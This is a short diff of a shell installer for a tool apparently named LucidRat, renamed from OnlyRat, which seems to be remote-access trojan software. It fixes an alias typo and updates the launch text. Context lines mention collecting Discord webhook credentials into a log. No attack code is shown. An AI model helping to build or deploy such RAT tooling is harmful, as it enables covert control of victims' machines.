@@ -20,7 +20,7 @@ echo [+] Completed
 
 # set up alias workflow
 echo [*] Setting up alias...
-echo "alias luicdrat=\"python3 $(pwd)/main.py\"" >> ~/.bashrc
+echo "alias lucidrat=\"python3 $(pwd)/main.py\"" >> ~/.bashrc
 echo [+] Completed
 
 # get discord webhooks
@@ -47,4 +47,4 @@ echo $webcreds >> webhooks.log
 # clean up
 echo [+] Installation Completed
 echo "- please restart your terminal"
-echo "- type 'onlyrat' launch OnlyRat"
+echo "- type 'lucidrat' launch LucidRat"
